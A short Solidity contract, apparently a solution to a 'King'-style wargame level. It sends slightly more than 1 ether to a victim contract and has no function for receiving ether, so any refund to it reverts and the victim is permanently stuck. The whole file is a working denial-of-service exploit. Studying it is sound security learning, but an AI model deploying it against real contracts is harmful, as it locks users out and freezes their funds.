
pragma solidity ^0.8.10;

contract KingMyHack {
    constructor() payable {
    }

    function hack(address payable victim) public {
        (bool sent, bytes memory data) = victim.call{value: 1000000000000000001}("");
        require(sent, "Failed to send Ether");
    }
}